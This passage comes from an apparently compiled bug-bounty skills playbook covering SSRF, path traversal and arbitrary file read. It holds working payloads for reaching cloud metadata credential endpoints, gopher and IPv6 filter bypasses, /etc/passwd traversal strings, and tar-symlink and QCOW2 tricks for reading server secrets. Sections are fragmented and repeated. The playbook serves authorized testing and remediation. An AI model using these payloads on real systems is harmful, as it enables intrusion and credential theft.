traversal is the delivery; OWASP A05:2021 Security Misconfiguration + A01:2021.

## [Bugbountyskills.md] file read displayed inside the guest — then stop

```

**Confirm:** Two channels: version evidence mapping the *host* hypervisor or
guest-additions to a public advisory's affected range, plus the exposed
device surface (guest additions present/enabled). In lab: the public PoC's
benign host-marker read on a version-matched build.

**False positives:** "VM detected" ≠ escape surface — a hypervisor with no
shared/emulated channels (no additions, virtio-net only) offers almost no
guest→host surface; say what exists before claiming risk. Device present
but host patched via *distro backport* — check the changelog, not the
vanilla version string. Guest crash ≠ host compromise (a crash is a lead —
verify whether the host service actually died, and never induce crashes on
production). Shared-folder write access is a configured feature, not a vuln
(unless permissions allow writing outside the share root — that's a config
finding of its own). Nested-virt sandboxes (microVMs, Firecracker-class)
have different surfaces — don't mislabel them.

**Impact:** Guest → host RCE, i.e. cross-tenant VM compromise on shared
hypervisors. Phrase as "guest-to-host via `<device>` on `<hypervisor>
<ver>` per `<advisory>`; benign lab proof: host-marker read; tenant blast
radius: `<other guests on host>`". Severity: Critical on multi-tenant hosts.

**Remediation:** Patch the hypervisor/guest-additions per vendor advisory,
remove unused emulated devices and guest channels, disable shared
folders/clipboard where unneeded, isolate tenants per host.

**CWE / OWASP:** CWE-20 (Improper Input Validation), CWE-787 (Out-of-bounds
Write), CWE-119; OWASP A06:2021 Vulnerable and Outdated Components.

## [Bugbountyskills.md] >> ssrf-testing — SKILL.md

*Source: `/root/Myskill/ssrf-testing/SKILL.md`*

## [Bugbountyskills.md] SSRF Testing — Deep Playbook

Server-side request forgery turns the server's network position into the
attacker's: localhost, internal ranges, and cloud metadata become reachable
from anywhere the app can be talked into fetching a URL. The bug is easy to
over-claim (echo ≠ fetch) and easy to under-scope (blind ≠ absent). This
skill makes the work methodical: inventory fetch points, prove server-side
fetch first, climb the ladder only as far as authorization requires, confirm
with a second independent signal, and stop at identity-level evidence for
cloud metadata.

## [Bugbountyskills.md] >> ssrf-testing — payloads.md (request templates, tool commands, evasion)

*Source: `/root/Myskill/ssrf-testing/references/payloads.md`*

## [Bugbountyskills.md] Payloads & Templates — SSRF

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. The ladder here
is ordered by risk — climb only as far as authorization and impact proof
require, and scan only in-scope ranges.

## [Bugbountyskills.md] 1. SSRF probing ladder

Climb in order; stop at the highest rung that proves impact. Scan only
in-scope ranges — never mass-scan third-party space.

**Rung 1 — confirm server-side fetch (collaborator):**

```
GET /api/fetch?url=http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-001
```

Log the source IP/ASN and fetcher UA (Go-http-client, python-requests...) —
that fingerprint feeds V-05/V-06 choices.

**Rung 2 — localhost:** `http://127.0.0.1/`, `http://localhost/`,
`http://[::1]/`, `http://0.0.0.0/`, `http://0/`, `http://127.1/`,
`http://2130706433/` (decimal), `http://0x7f000001/` (hex),
`http://0177.0.0.1/` (octal), `http://[::ffff:127.0.0.1]/`

**Rung 3 — loopback aliases (DNS-based, no encoding needed):**
`http://localtest.me/`, `http://lvh.me/`, `http://vcap.me/`,
`http://127.0.0.1.nip.io/`, `http://localhost.localtest.me/`

**Rung 4 — link-local / cloud metadata** (see the identity rule below):

```
AWS IMDSv1:  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS IMDSv2:  PUT http://169.254.169.254/latest/api/token
             Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
             then GET .../latest/meta-data/ with X-aws-ec2-metadata-token: <TOKEN>
GCP:         GET http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
             Header (required): Metadata-Flavor: Google
             (also try http://metadata.google.internal/... for DNS-level proof)
Azure:       GET http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01
             Header (required): Metadata: true
Alibaba:     GET http://100.100.100.200/latest/meta-data/ram/security-credentials/
ECS (AWS):   GET http://169.254.170.2/v2/metadata/   (task metadata; identity fields only)
K8s:         GET http://10.96.0.1:443/  (API reachability only; token use = chain with
             info-disclosure/path-traversal skills, lab depth)
```

> **Identity rule:** cloud metadata access is proven by identifying the role,
> service-account email, VM ID, or task — **not by dumping credentials**. Fetch
> the role *name*, the instance identity document, the service-account email,
> then stop. Do not retrieve, screenshot, or retain credential JSON/tokens;
> redact anything token-like from report evidence.

**Rung 5 — internal ranges (in-scope only):** `10.0.0.0/8`,
`172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `100.64.0.0/10` (CGNAT),
`172.17.0.1` (docker bridge), `10.96.0.0/12` (k8s services). Differentials:
open port → fast/app-level response vs closed → fast TCP-refuse vs filtered →
slow timeout. Two timing samples per port, plus a control.

Curl one-liners for authorized/lab use:

```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # role name only
TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' \
  http://169.254.169.254/latest/api/token)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/          # role name only
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
```

## [Bugbountyskills.md] >> ssrf-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/ssrf-testing/references/variants-1.md`*

## [Bugbountyskills.md] SSRF Variants (V-01 … V-06)

Deep playbook sections for all six SSRF variants. Work the **Detect**
steps in order, climb the probing ladder in `payloads.md` only as far as
authorization and impact proof require, and check **False positives**
before writing anything up.

## [Bugbountyskills.md] V-01: Internal network mapping via basic SSRF scanning mechanisms

**Mechanism:** The server fetches a URL/hostname/IP chosen by the attacker
(webhook, import-from-URL, link preview, avatar fetch). The violated
assumption is "the destination is not attacker-controlled": DNS resolution
and TCP connect happen from the server's network position, which typically
trusts localhost, RFC1918, and link-local ranges the attacker cannot reach
directly.

**Preconditions:**
- A URL/hostname/IP parameter that triggers a server-side fetch
- Needed schemes pass (`http/https` at minimum; more in V-05)
- No destination allowlist, or a parser differentials defeat it
- Fetch happens synchronously or its result is visible (else V-02)

**Detect:**
1. Find fetch points: `url`, `webhook`, import/export-from-URL, PDF/print,
   oEmbed/link preview, avatar-from-URL, "check site" health tools.
2. Rung 1 (safe): point at `http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-001` —
   collaborator DNS+HTTP hit proves *server-side* fetch (check source IP:
   server's ASN, non-browser UA — a hit from the victim's browser is client-
   side, not SSRF).
3. Climb the ladder in `payloads.md` §1: localhost → loopback aliases →
   decimal/hex/octal encodings → link-local → internal ranges. Record which
   rungs respond.
4. Reflected vs blind: does the response body contain fetched content?
   Full-read SSRF is a different severity tier — say which you have.
5. Filter bypass notes to try inline: parser differentials
   (`http://allowed.tld#@127.0.0.1`, `http://allowed.tld@127.0.0.1`),
   redirect-based bypass (your box 302s to internal after an allowlisted
   check), IPv6 (`[::ffff:7f00:1]`), DNS names resolving to loopback
   (`localtest.me`, `127.0.0.1.nip.io`).
6. Port mapping via differentials (in-scope ranges only, slow pacing):
   open → app-level response, refused → fast error, filtered → timeout.
   Two samples per port plus a control to defeat noise.

**Proof of concept:**
```
GET /api/fetch?url=<PLACEHOLDER_URL> HTTP/1.1

rung 1: url=http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-001
rung 2: url=http://127.0.0.1:<PORT>/
rung 3: url=http://127.0.0.1.nip.io/
```

**Confirm:** Collaborator HTTP hit (server IP + fetcher UA) *and* either
fetched internal content reflected or a reproducible timing differential
against a control port. Both must survive a re-send.

**False positives:** Frontend link previews that fetch from the *user's*
browser (hit comes from your IP/browser UA). DNS prefetch/metadata scrapers
on marketing pages. CDN edge fetches (hit from CDN IP, not origin). Apps
that merely *reflect* the hostname you gave without fetching (echo ≠ SSRF —
the collaborator check is exactly what rules this out). "Port open" claims
from single timing samples.

**Impact:** Reachability into localhost and the internal network: internal
admin panels, databases with default creds (report reachability, don't
brute-force), and stepping-stone to V-03 metadata. Phrase as "server-side
fetch to arbitrary destinations incl. `<rungs reached>` from app egress IP
`<IP>`".

**Remediation:** Egress-filter at the network layer (deny RFC1918,
link-local, metadata ranges) *and* validate URLs at the app layer against an
allowlist of exact hosts, resolving once and pinning the IP; disable redirects.

**CWE / OWASP:** CWE-918 (Server-Side Request Forgery); OWASP A10:2021
Server-Side Request Forgery; WSTG — Testing for SSRF.

## [Bugbountyskills.md] V-02: Infrastructure verification via asynchronous blind SSRF pipelines

**Mechanism:** The fetch runs in a background worker (queue, cron, webhook
test, "process this URL" job) so the HTTP response never reflects fetched
content. Detection therefore depends entirely on out-of-band side channels —
DNS/HTTP callbacks, job-state changes, timing of completion — which is why
this variant is missed when testers only look at response bodies.

**Preconditions:**
- An async feature that takes an attacker URL (webhook test, import job,
  PDF-by-email, sitemap/news crawler)
- The worker has egress (often *more* than the web tier — no WAF in path)
- Some attribution channel: OOB domain, job status/log the tester can read

**Detect:**
1. Trigger the job with `url=http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-<TOKEN>`
   — a **unique path per test** so late/duplicate hits stay attributable.
2. Watch the collaborator (DNS *and* HTTP) while recording the enqueue
   time; async hits arrive seconds-to-minutes later — correlation, not
   simultaneity, is the signal.
3. Log full request headers on your callback server: Go-http-client,
   python-requests, `Go-http-client/2.0` fingerprints the worker stack for
   later variants (V-05/V-06).
4. Rule out victim-side fetches: hits showing browser UA, your own egress
   IP, or arriving while the page is open = client-side; hits with server
   UA/ASN after the tab closes = server-side.
5. If job logs/errors are visible, inject URLs producing distinguishable
   failures (DNS-fail vs connection-refused vs HTTP 500) to map reachability
   *without* OOB — error differentials are a second, independent channel.
6. Use OOB DNS-only variants (`nslookup <TOKEN>.<OOB>`) when HTTP egress is
   filtered but DNS isn't — workers often leak DNS via internal resolvers.

**Proof of concept:**
```
POST /api/jobs HTTP/1.1
Content-Type: application/json

{"target_url": "http://<PLACEHOLDER_OOB_DOMAIN>/ssrf-<TOKEN>", "type": "preview"}
```

**Confirm:** Unique-path hit on your collaborator from a non-browser
source/ASN *and* a second signal (job-status change or error differential
tied to target state) that reproduces on re-trigger. Timing alone or a bare
DNS hit alone is a lead.

**False positives:** Your own earlier tests' delayed hits — unique tokens
fix this. Email security gateways / link unfurlers following stored URLs
(hit UA/ASN says "scanner", not app). Cached jobs replaying old payloads.
Victim-side prefetch on SPA apps (check source IP). Shared-collaborator
cross-talk between engagements — namespace your domain per test.

**Impact:** Blind but real: internal port-state mapping via job timing,
fetcher fingerprinting for follow-up variants, and (with V-05/V-06) turning
async fetches into protocol-level or exfil-capable SSRF. Phrase as
"server-side fetch from background worker, OOB confirmed at `<timestamp>`,
destination fully attacker-controlled". Do not trigger job floods — pacing is
part of the no-destructive rule.

**Remediation:** Run workers in an egress-restricted network namespace with
a destination allowlist; queue-time URL validation plus re-validation at
fetch; surface the fetch target to users so suspicious jobs are visible.

**CWE / OWASP:** CWE-918 (SSRF); OWASP A10:2021 SSRF.

## [Bugbountyskills.md] IMDSv2 through a verb/header-controlling SSRF (V-05):

PUT /latest/api/token  X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/iam/security-credentials/  X-aws-ec2-metadata-token: <TOKEN>
```

**Confirm:** The role name / VM id / service-account email (environment-
unique data reflection cannot fake) *plus* repeatability on a second fetch.
That is sufficient — two signals, zero credentials.

**False positives:** Timeout on `169.254.169.254` from a non-cloud box is a
non-finding. IMDSv2-enforced accounts have no credential exposure even with
perfect SSRF — do not claim takeover. Dev laptops with AWS CLI env vars do
not imply metadata exists. 400/403 from GCP/Azure *without* the required
header still proves reachability (error-type differential), but a generic
app-level "blocked URL" page reflects nothing — check who generated the
response. Alpine/busybox images without curl don't change SSRF facts —
don't mistake tooling errors for filter blocks.

**Impact:** "SSRF → cloud metadata → instance can assume role `<NAME>`";
describe the role's *implied* permissions from its name/policy class if
known. **Report without retaining credentials:** no token JSON in evidence,
no screenshots of secrets, no use of the credentials for any action — the
role name plus the fetch proves it. Severity: Critical when the role is
powerful.

**Remediation:** Enforce IMDSv2 with hop limit 1 (`HttpPutResponseHopLimit`),
block link-local/metadata egress at the instance firewall/VPC policy, move to
short-lived workload identity with least privilege, and apply SSRF fixes
from V-01.

**CWE / OWASP:** CWE-918 (SSRF) with CWE-522 (sensitive credential exposure);
OWASP A10:2021 SSRF; Cloud Security Alliance metadata-hardening guidance.

## [Bugbountyskills.md] V-05: SSRF via protocol smuggling (Gopher/DICT/FTP tunnelling)

**Mechanism:** The fetcher passes non-HTTP schemes through — `gopher://`
sends attacker bytes raw over TCP, `dict://`/`ftp://`/`tftp://` speak other
protocols, `file://` reads local paths. A plain SSRF escalates from "make an
HTTP request" to "write arbitrary bytes to an arbitrary internal TCP port":
verb control, header smuggling (CRLF), and direct talks to Redis, Memcached,
SMTP, and internal HTTP admin surfaces.

**Preconditions:**
- The app's HTTP client passes the scheme through (older curl/libcurl,
  urllib/requests stacks of certain eras, some Java/Go fetchers, desktop-ish
  WebView bridges) — modern stacks disable gopher/file by default, so
  **verify through the app, never from your local `curl -V`**
- Target service speaks a protocol you can encode in the payload
- SSRF parameter accepts full URLs (scheme not stripped)

**Detect:**
1. Scheme ladder (safe → deeper): `file:///etc/hostname` (read-class — note
   it, chain LFI detail with `path-traversal-testing`),
   `dict://<OOB_DOMAIN>:80/info:`, `ftp://<OOB_DOMAIN>/`,
   `gopher://<OOB_DOMAIN>:80/_MARKER`. Differentiate errors: "unsupported
   scheme" (dead end) vs connection attempt (reachable).
2. Safe proof first: point gopher at **your own** listener and send a
   marker byte string — arrival with exact bytes proves raw-byte control
   with zero internal impact. This is the required first step, per ladder.
3. Fingerprint the client from your listener's received bytes (ClientHello/
   header order/`User-Agent`) to pick encoding strategy (CRLF placement,
   `_` prefix, URL-encoding depth).
4. Escalation (in-scope only): gopher'd HTTP with `%0d%0a` CRLF to inject
   verbs/headers into an internal service you can otherwise observe;
   FTP passive-mode pivot (fetcher connects to you, you 301 to internal).
5. Evasion notes: `%0d%0a` for newlines, `%00` tolerated by some parsers,
   double-URL-encoding when the app decodes twice, `_` payload prefix
   required by gopher. Check scheme filters case-insensitively
   (`GoPhEr:`) and with leading whitespace/backslashes.

**Proof of concept:**
```
GET /api/fetch?url=<PLACEHOLDER_URL> HTTP/1.1

byte-control: url=gopher://<PLACEHOLDER_LISTENER>:9999/_HELLO<%0d%0a>MARKER
internal:     url=gopher://<PLACEHOLDER_INTERNAL_HOST>:<PORT>/_<URL_ENCODED_PAYLOAD>
read-class:   url=file:///etc/hostname
```

**Confirm:** Marker bytes arrive at your listener exactly as encoded
(byte-level match = you control payload content) **and**, for internal
claims, an observable state change on an in-scope service you can verify
through a legitimate channel. Never prove this with destructive commands —
lab depth only for write-primitive chains.

**False positives:** "Gopher works" inferred from local tooling instead of
the app's own fetcher. Hits on your listener produced by your own client
timing, not the server (check source IP). Internal HTTP 200 reached via
gopher that plain SSRF would equally reach — same severity, fancier
technique; don't inflate. `file://` "read" of content the app also reflects
from a normal param = not LFI.

**Impact:** SSRF→protocol control: internal auth-less service access (Redis/
Memcached/SMTP), HTTP verb/header injection past internal-only checks, and
`file://` local reads. Phrase the reachable *protocols and services*, cite
the byte-control proof, and keep write-primitive chains (e.g., Redis
`CONFIG SET`) as lab-demonstrated potential.

**Remediation:** Strict scheme allowlist (`https:` only) applied after URL
parsing, reject non-HTTP on redirect, and upgrade HTTP clients (modern
libcurl ships without gopher/dict/tftp).

**CWE / OWASP:** CWE-918 (SSRF) with CWE-93 (CRLF/header injection);
OWASP A10:2021 SSRF.

## [Bugbountyskills.md] V-06: SSRF via PDF/image rendering engines and cross-origin objects

**Mechanism:** Server-side renderers (wkhtmltopdf, Chromium print-to-PDF,
WeasyPrint, Puppeteer, ImageMagick, LibreOffice, OCR pipelines) fetch
subresources referenced in documents: `<img src>`, CSS `url()`, `@font-face`,
SVG `<image href>`, PDF XObjects/`/URI`. A document feature becomes SSRF —
and, when the renderer embeds fetched bytes into the returned PDF/image,
SSRF **with an exfiltration channel**: internal page content lands in the
file the attacker downloads.

**Preconditions:**
- A render feature (HTML/markdown → PDF, invoice/report export, image
  resize-from-URL, SVG rasterize) accepts attacker-influenced content or URL
- Renderer runs with network access (default in many deploys)
- Returned artifact reflects subresource content (exfil tier) or callback
  timing (blind tier)

**Detect:**
1. Find the feature: "Print/PDF export", "save as PDF", HTML→PDF APIs,
   image-proxy/resize endpoints, logo-from-URL, OCR of fetched docs.
2. Safe probe: plant `http://<PLACEHOLDER_OOB_DOMAIN>/pdf-<TOKEN>.png` as
   an `<img>` (or CSS `url()`) in input you control; trigger the render;
   expect a collaborator hit fingerprinting the renderer UA — no internal
   target touched yet.
3. Climb (ladder rung 4/5): swap the src to `http://127.0.0.1:<PORT>/`,
   then metadata per V-03 — **identity fields only**, never credentials.
4. Exfil tier: if fetched content is embedded in the returned artifact,
   download it and extract the one marker/hostname needed as proof. Note
   CSS/DNS-exfil techniques in the report as *capability*; demonstrating
   one marker suffices — bulk data theft is prohibited (guardrail).
5. Renderer gotchas: WeasyPrint blocks some schemes; wkhtmltopdf disables
   JS but still loads images/fonts; Chromium needs `networkidle` waits
   (delayed hits are normal); rendered-doc caches dedupe re-fetches — vary
   the `<TOKEN>` per attempt.

**Proof of concept:**
```
POST /api/export HTTP/1.1
Content-Type: application/json

{"html": "<img src=\"http://<PLACEHOLDER_OOB_DOMAIN>/pdf-<TOKEN>.png\">"}   # callback

### [Bugbountyskills.md] SSRF

1. Find URL/redirect/image/webhook parameters
2. Try internal IPs (169.254.169.254, 127.0.0.1, 0.0.0.0)
3. Check DNS rebinding bypass
4. Look for SSRF + cloud metadata = RCE
5. Test file:// protocol, custom headers, IP alternatives

## [Bugbountyskills.md] SSRF via xmlrpc: enumerate methods, then pingback.ping <attacker_url> <target_url>

curl -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' https://T/xmlrpc.php

### [Bugbountyskills.md] SSRF Pattern

```
1. Find URL/redirect/image/webhook parameters
2. Try internal IPs (169.254.169.254, 127.0.0.1, 0.0.0.0)
3. Check for DNS rebinding bypass
4. Look for SSRF + cloud metadata = RCE
5. Test file:// protocol, custom headers, IP alternatives
```

## [Bugbountyskills.md] SSRF

## [Bugbountyskills.md] Path Traversal

```python
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252f..%252f..%252fetc/passwd
```

## [Bugbountyskills.md] LFI / path traversal (`path-traversal-testing`)

| Endpoint | Param | Signal | Status |
|---|---|---|---|
| `POST /api/business/massAssignment` | upload **filename** | server-side file handling | Untested |
| `GET /api/proxy/orders/{id}/{itemId}` | ids | file resolution by id | Untested |
| `GET /[uid]`, `/attractions/[uid]` | path | Next.js catch-all routing | Untested |
| `/_next/static/*` | path | static asset serving | 200 with validated `_abck` |

## [Bugbountyskills.md] SSRF (`ssrf-testing`)

| Endpoint | Param | Signal | Status |
|---|---|---|---|
| `GET /api/proxy/payment/getUrl?paymentRef=` | `paymentRef` | **returns a URL to the client** → open-redirect/SSRF-ish | Untested |
| Prismic `oembed` | `embed_url` | oEmbed fetch is a classic SSRF | **Ruled out unauth** — CMS-author supplies it |
| `POST /api/proxy/smtp/contactForm` | **`email_to`** | recipient is client-supplied → arbitrary mail relay (abuse, not SSRF) | Untested — single test max |

No webhook/URL-fetch/import-from-URL parameter exists in the client code. **SSRF surface is thin.**

## [Bugbountyskills.md] 4. Path traversal

```
/assets/../../../../etc/passwd                  400  150 B  text/html
/assets/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd   400  150 B
/assets/..%252f..%252fetc/passwd                403  9 B    text/plain  ("Forbidden")
/assets/....//....//etc/passwd                  403  9 B
/assets/..;/..;/etc/passwd                      403  9 B
/assets/%252e%252e%252fetc/passwd               404  7790 B (app 404)
/download?file=../../../../etc/passwd           404  7790 B
```
Two distinct denial layers: nginx 400 (raw `../`), "Forbidden" 9 B (encoded/obfuscated),
Rails uniform 404 otherwise. No file contents anywhere.

### [Bugbountyskills.md] 17.5 SSRF filter bypass via the NAT64 local-use IPv6 prefix `64:ff9b:1::/48`

SOURCE: HackerOne #3634400 — arkadiyt/ssrf_filter v1.3.0, "SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix" (CVSS 7.5, High, disclosed 2026-03-31)  read 2026-11-07
CLASS: SSRF filter bypass (CWE-918)
CORE METHOD:
  1. Recover the target's SSRF blocklist behaviour. Many libraries block IPv4 private ranges and the well-known NAT64 prefix `64:ff9b::/96`, but forget the NAT64 local-use prefix `64:ff9b:1::/48`.
  2. Encode an internal IPv4 under that prefix: `64:ff9b:1::7f00:1` = 127.0.0.1; `64:ff9b:1::a9fe:a9fe` for link-local/metadata; feed the URL to the fetcher.
  3. Where the deployment actually routes NAT64 (IPv6-only / dual-stack clouds, Kubernetes), the request is translated to the embedded IPv4 → internal hit, while the filter sees a "public" IPv6.
  4. Verify with a controlled listener bound to that address, or by reading an internal-only response / cloud metadata.
  Same family: IPv4-mapped IPv6 `::ffff:127.0.0.1`, IPv6 zone ids, other NAT64 prefixes, and alternate encodings (decimal/octal/hex IPv4, `[::]`).
DETECTION SIGNAL: SSRF exists and a "public-only" filter rejects `127.0.0.1`/`169.254.169.254` but ACCEPTS an IPv6 literal; infra is IPv6-capable/NAT64-enabled; filter code references `64:ff9b::/96` but not `64:ff9b:1::/48`.
CHAIN: SSRF filter primitive (IPv4 blocked) → NAT64 local-use prefix bypass → request to loopback/link-local → cloud metadata → IAM creds → internal services → RCE.
TRANSFERABLE TEST: For every SSRF param, once `http://127.0.0.1/` is blocked try `http://[64:ff9b:1::7f00:1]/`, `http://[::ffff:127.0.0.1]/`, `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1/`. Any one reaching the same internal target is a filter bypass.

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] 17.13 Archive symlinks not stripped on extract -> symlink followed at load -> arbitrary file read (GitLab bulk-import UploadsPipeline)

SOURCE: https://hackerone.com/reports/1439593  2026-11-07
CLASS: path traversal / arbitrary file read via archive symlink (CWE-59 / CWE-22) — GitLab bulk-import UploadsPipeline
CORE METHOD:
  1. `BulkImports::Pipeline::ExtractedData` lists every path under the extracted `uploads.tar.gz` with `Dir.glob(File.join(tmp_dir,'**','*'))` AFTER `untar_zxf` — which "only changes the permissions" and does NOT strip symlinks.
  2. Craft `uploads.tar.gz` whose entries are SYMLINKS to server files:
     `mkdir ./<32-byte-upload-secret> && ln -s /etc/passwd ./<secret>/passwd && ln -s /srv/gitlab/config/secrets.yml ./<secret>/secrets.yml && tar cvzf uploads.tar.gz ./<secret>`
  3. The 32-byte secret is the upload-path hash you get by first uploading a normal file `passwd` into a milestone description (the import re-downloads/re-extracts that upload).
  4. At `load`, the symlink is FOLLOWED: `UploadService.new(context.portable, File.open(file_path,'r'), ...)` reads the TARGET file and stores it as the imported upload (downloadable with git-user privileges).
  5. Serve the crafted tar from a small proxy / fake remote GitLab; run "import group"; open the imported milestone and click `passwd` → /etc/passwd; swap the name for `secrets.yml` → secrets file.
DETECTION SIGNAL: any archive extract-then-process flow (group/project import, theme/plugin upload, backup restore, user-content tar/zip) that globs/recursively walks extracted files but never rejects symlink entries or checks that the resolved path stays inside the extraction dir; a later `File.open` on a path never `realpath`-validated against the base dir.
CHAIN: helper-role user who can import a group → symlinks survive untar → symlink followed on load → arbitrary file read as `git` → `secrets.yml` (`secret_key_base`, `otp_key_base`, `db_key_base`, `openid_connect_signing_key`, `ci_jwt_signing_key`) + `gitlab.yml` object-store creds + `gitlab-registry.key` → read all backups, use `db_key_base` to decrypt `attr_encrypted` (`bulk_import_configurations`, CI variables, app settings) → Critical 9.6 (raised from high 8.6) → $29,000.
TRANSFERABLE TEST: For any archive-upload/import feature, build a tar/zip containing a symlink entry to `/etc/passwd` (and to the app's config/secrets path), upload/import, then request the resulting stored object; if you get the target file back it is arbitrary file read. Also test `../`-named entries and whether extraction resolves paths back into the base dir.

### [Bugbountyskills.md] 17.15 Unsanitised value reflected into HTML rendered by a PDF/headless-browser generator -> iframe -> SSRF to cloud IMDS (HackerOne Analytics Reports)

SOURCE: https://hackerone.com/reports/2262382  2026-11-07
CLASS: SSRF via unsanitised value injected into HTML rendered by a PDF / headless-browser generator (CWE-918) — HackerOne Analytics Reports
CORE METHOD:
  1. Entry: the analytics-report PDF export takes a document spec whose entries include `{type:'template', template:<value>}`. If `template_path` resolves it renders a partial; if NOT, the code returns an error STRING with the raw value interpolated: `"Missing template for element: #{element[:template]}"`.
  2. That string is part of `html_without_layout`, which is "fed into a library that converts this into a PDF".
  3. Put an `<iframe>` (or `<img src=…>`/`<link>`) in the `template` value ⇒ your HTML lands in the PDF document ⇒ the generator's browser engine FETCHES the URL ⇒ server-side request from the app server.
  4. Point it at the cloud metadata service (IMDS) to pull temporary AWS credentials.
  5. Vendor diff (the fix) proves the vector: `-"Missing template for element: #{element[:template]}"` → `+"Missing template for element"` (reflected input removed).
DETECTION SIGNAL: any feature that renders user-influenced content to PDF/image via a headless browser or HTML→PDF library (invoice/report export, "download as PDF", email-to-PDF, screenshot-as-a-service); user input echoed into an HTML string — INCLUDING error messages — that is then rendered; a renderer allowed to make outbound requests (no network isolation).
NOTE: source #2262382 is already cited in the ledger §2.2 for the "error message as response oracle" angle; this entry records the distinct, previously-unrecorded mechanism — HTML injection into the PDF renderer as the SSRF vector.
CHAIN: controllable `template` value reflected into an HTML string → HTML/iframe injection into the PDF render step → headless browser fetches an attacker URL → SSRF to `169.254.169.254/latest/meta-data/iam/security-credentials/` → temp AWS creds → account/asset access (Critical 10.0, $25,000; CVSS AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N).
TRANSFERABLE TEST: At every PDF/HTML render sink inject `<iframe src="http://<collab>/">` (and in error paths that reflect your input); confirm an outbound hit from the render host, then aim it at the cloud metadata IP (plus GCP/Azure equivalents) to demonstrate credential read. Treat any "template/id/name not found: <input>" error as an HTML-injection candidate into the renderer.

### [Bugbountyskills.md] 17.24 Disk-image backing-file / external-data-file reference → arbitrary server file read

SOURCE: assigned https://hackerone.com/reports/1024899 ("file read on MCS servers via supplying a QCOW2 image with external backing file", $15,000) — report body NOT public (.json 404, Cloudflare HTML, jina→sign_in, Wayback SPA shell, public dataset VI empty). Class recorded from the readable writeup of the same mechanism, https://shakenfist.com/components/instar/security/  read 2026-11-07
CLASS: internal/arbitrary file read via disk-image format features — QCOW2 `backing_file` / external data file / VMDK flat descriptor (CWE-73/CWE-22; CVE-2015-5163, CVE-2022-47951, CVE-2024-32498)
CORE METHOD:
  1. Find a feature that ingests a user-supplied disk image and opens it server-side (VM/volume import, snapshot/backup restore, image converter `qemu-img convert`, forensic scanner).
  2. Craft an image whose header references an external file: QCOW2 `backing_file = ../../../../etc/shadow` (or the external data file), or a VMDK flat descriptor.
  3. The parser follows the reference and opens the server file; format auto-detection falls back to RAW for unknown data, so the file bytes are read as disk data instead of being rejected.
  4. Read the image back (attach/boot, or `qemu-img convert`/`map`) → the server file's contents appear in the disk output.
  5. Target `/etc/shadow`, cloud credential files, SSH/IAM keys, `/proc/*/environ`, and other tenants' images.
DETECTION SIGNAL: a server-side disk-image ingestion path (import/upload/convert/restore) whose parser (qemu-img/qemu) runs with server privileges and honours metadata external-file references; a file NAMED `.raw` that actually carries a QCOW2 signature defeats format checks.
CHAIN: user uploads a disk image → header `backing_file` names an arbitrary server path → parser reads it as disk data (raw fallback) → read the image back → arbitrary server file read → credential theft → lateral movement/RCE.
TRANSFERABLE TEST: Upload a QCOW2 whose `backing_file` is `../../../../etc/passwd` (+ external-data-file and VMDK-descriptor variants), then `qemu-img convert`/`map` or boot/mount it and grep the output for `root:x:` — a hit is arbitrary server file read.

### [Bugbountyskills.md] 17.29 Record-export path re-serves ACL-hidden content + guessable attachment ids -> internal file read (HackerOne "Export as .zip" #186230)

SOURCE: https://hackerone.com/reports/186230 — HackerOne export feature (High; self-report)  read 2026-11-07 (public report body)
CLASS: internal file read / broken access control on an export feature + IDOR on media-object ids
CORE METHOD:
  1. The "Export as .zip" feature archives the FULL record — HackerOne's own words: "including any internal comments and attachments" — i.e. it is built from the record, not from the exporting viewer's ACL-scoped view.
  2. Exporting disclosed report #182358 after its attachment had been removed from the thread still yielded the image inside `HackerOne_Report-security#182358.zip`: the inline attachment REFERENCE (`{F134909}`) survives in the body, so the exporter re-resolves and re-includes the file.
  3. HackerOne's RCA names the second primitive: inline attachments "could be misused to potentially view internal attachments at a future point based on guessing attachment identifiers" — media objects are fetchable by their own enumerable id, independent of the parent record's ACL.
DETECTION SIGNAL: any export/download/"download all" path (report/ticket export, GDPR data export, repo or notebook archive); dangling `{F…}`/media-reference tokens whose attachment was deleted or redacted; media ids that are sequential, short, or cross-tenant.
CHAIN: any viewer of a record → export it → team-only comments + removed attachments recovered → enumerate media ids for other teams' internal files → internal file read of non-public data.
TRANSFERABLE TEST: Run the export on a record whose internal parts you cannot see, then `unzip -l` + grep for team-only fields and deleted-attachment filenames; take one attachment id from the archive and request neighbouring ids and the same id without a session — a 200 on an object the UI hides is the IDOR.

### [Bugbountyskills.md] 17.36 Path traversal carried in an uploaded artifact's OWN METADATA (not the URL path) → arbitrary file write → engine copy-race → arbitrary file read (GitLab Nuget registry #822262)

SOURCE: https://hackerone.com/reports/822262 — GitLab 12.8.7-EE, "Path traversal in Nuget Package Registry", High, reporter saltyyolk ("SaltyYolk")  read 2026-11-07 (body via the HackerOne `.json` endpoint, 4,772 bytes; web_extract = SPA shell, r.jina.ai = 403)
CLASS: path traversal via untrusted artifact metadata → arbitrary file write, chained to arbitrary file read · CWE-22
CORE METHOD:
